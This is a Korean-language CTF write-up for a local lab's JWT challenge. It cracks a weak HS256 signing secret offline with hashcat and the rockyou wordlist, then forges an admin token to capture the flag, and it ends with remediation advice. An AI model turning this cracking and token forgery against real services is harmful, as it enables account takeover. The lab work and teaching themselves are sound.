+++
title = "VulnABLE CTF [LUXORA] Write-up: JWT Attacks 🥈 Silver"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "JWT", "Silver", "Brute Force", "Hashcat", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: JWT Attacks 🥈 Silver

## 🎯 챌린지 개요
- **카테고리**: Authentication Layer (JWT Attacks)
- **난이도**: 🥈 Silver
- **타겟 경로**: `/jwt/silver`
- **목표**: 서버가 `none` 알고리즘을 강력히 차단하는 환경에서, 취약한 JWT 비밀키(Weak Secret Key)를 오프라인 크래킹으로 알아내어 관리자 토큰을 위조하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 분석 (Reconnaissance)

Bronze 단계와 마찬가지로 `/jwt/silver` 에 일반 테스트 계정으로 접속하여 JWT를 획득합니다.

**[획득한 JWT]**
```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiZ3Vlc3QifQ.
tG3z_6T_uM7E6m... (서명 부분 생략)
```

Bronze에서 썼던 `alg: none` 기법을 적용해 서버로 전송해 봅니다.

### 🚨 서버의 응답
```json
{
  "error": "Invalid Token Signature or Algorithm. Only HS256 is allowed."
}
```

**[해커의 사고 과정]**
1. 개발자가 `none` 알고리즘의 위험성을 깨닫고, 검증 로직에 `algorithms: ['HS256']` 옵션을 강제해 두었다.
2. 따라서 서버는 토큰의 마지막 '서명(Signature)' 부분이 올바르지 않으면 무조건 거부한다.
3. HS256 서명은 `비밀키(Secret)`로 만들어진다. 서버의 소스코드를 털지 않는 이상 비밀키를 알 방법이 없다.
4. **하지만 개발자가 비밀키를 아주 쉬운 단어(`123456`, `secret`, `admin` 등)로 설정해 두었다면?**
5. 내가 가진 토큰 원본을 이용해, 내 컴퓨터에서 무한대로 단어를 대입해보는 **오프라인 크래킹(Offline Cracking)**을 시도해보자!

---

## 💥 2. 오프라인 크래킹 수행 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ]
|-- Decodes JWT
|-- Modifies Payload (role: admin)
|-- Signs with 'None' alg / Cracked Secret --> [ Web Server ]
                                               |-- Trusts JWT
```


웹 서버에 계속 로그인을 시도하면 IP가 차단당합니다. 하지만 오프라인 크래킹은 이미 탈취한 토큰을 이용해 내 컴퓨터 내부에서만 연산을 수행하므로, 서버는 내가 해킹을 시도하는지조차 알 수 없습니다.

### 💡 크래킹 도구 및 사전 파일 준비
* **도구**: 강력한 패스워드 크래킹 툴인 **Hashcat**을 사용합니다.
* **사전(Wordlist)**: 전 세계 해커들의 표준 사전 파일인 **`rockyou.txt`** (1,400만 개의 유출된 비밀번호 목록)를 사용합니다.

### 🚀 Hashcat 구동
탈취한 JWT를 `jwt.txt` 라는 파일에 저장한 뒤, Hashcat을 돌립니다.

```bash
# JWT를 파일로 저장
$ echo "eyJhbGci...생략..." > jwt.txt

# Hashcat 실행
# -m 16500 : 해시 타입이 JWT임을 명시
# -a 0 : 사전 공격(Dictionary Attack) 모드
$ hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt
```

### 🔍 크래킹 결과
최신 컴퓨터의 연산 속도로는 `rockyou.txt` 전체를 뒤지는 데 몇 초밖에 걸리지 않습니다.

```text
...
eyJhbGciOiJIUzI1... : supersecret123
...
Session..........: hashcat
Status...........: Cracked
Hash.Name........: JWT (JSON Web Token)
...
```

Hashcat이 멈추며, 서버가 사용 중인 비밀키가 **`supersecret123`** 임을 뱉어냅니다!

---

## 🚀 3. 토큰 위조 및 권한 탈취 (Forging Token)

이제 우리는 서버가 가진 마스터키(비밀키)를 손에 넣었습니다. 내가 스스로 유효한 서명을 만들어낼 수 있는 "신"이 된 것입니다.

### JWT 조작 (jwt.io 활용)
가장 간편하게 `jwt.io` 사이트에 접속하여 조작합니다.
1. **Payload 수정**: `"role": "guest"` 부분을 `"role": "admin"` 으로 변경합니다.
2. **Verify Signature 수정**: 방금 알아낸 비밀키인 `supersecret123`을 우측 하단의 Secret 칸에 입력합니다.
3. **새 토큰 생성**: 좌측의 Encoded 창에 새로 생성된 완벽한 악성 JWT가 나타납니다.

### 패킷 전송
이 새 토큰을 복사하여, 관리자 페이지(`/jwt/silver/admin`)로 요청을 보냅니다.

```http
GET /jwt/silver/admin HTTP/1.1
Host: localhost:3000
Cookie: token=[새로 만든 관리자 토큰]
```

### 서버의 응답
서버는 자기가 만든 서명과 완벽히 일치하므로 의심 없이 문을 열어줍니다.

```json
{
  "message": "Welcome Admin! Access Granted.",
  "flag": "FLAG{JWT_🥈_WEAK_SECRET_D8F1A2}"
}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

강력한 알고리즘(HS256)을 강제했더라도, 그 알고리즘을 보호하는 **근본적인 키(Key)가 취약하다면** 오프라인 무차별 대입 공격에 의해 시스템 전체가 장악될 수 있음을 확인했습니다.

**🔥 획득한 플래그:**
`FLAG{JWT_🥈_WEAK_SECRET_D8F1A2}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
JWT의 보안은 전적으로 **'비밀키의 복잡성'**에 의존합니다. 비밀키가 털리면 JWT의 모든 신뢰 모델이 붕괴합니다.

* **취약한 설정**
```javascript
// 코드에 하드코딩되거나 짧은 단어로 설정된 비밀키
const SECRET_KEY = "supersecret123"; 
```

* **안전한 설정 가이드**
1. **강력한 난수 사용**: 비밀키는 사람이 외울 수 있는 단어가 아닌, 컴퓨터가 생성한 최소 256비트(32바이트) 이상의 고엔트로피 난수여야 합니다.
   ```bash
   # 안전한 키 생성 예시
   $ openssl rand -base64 32
   ```
2. **환경 변수 분리**: 비밀키는 소스코드(GitHub 등)에 절대 하드코딩하지 말고, 런타임 환경의 `.env` 파일이나 AWS Secrets Manager 같은 안전한 저장소에서 불러와야 합니다.
3. **주기적인 키 롤테이션(Key Rotation)**: 만에 하나 키가 유출되었을 때를 대비하여, 시스템 내부적으로 주기적으로 키를 교체(Rotate)하는 메커니즘을 두어야 합니다.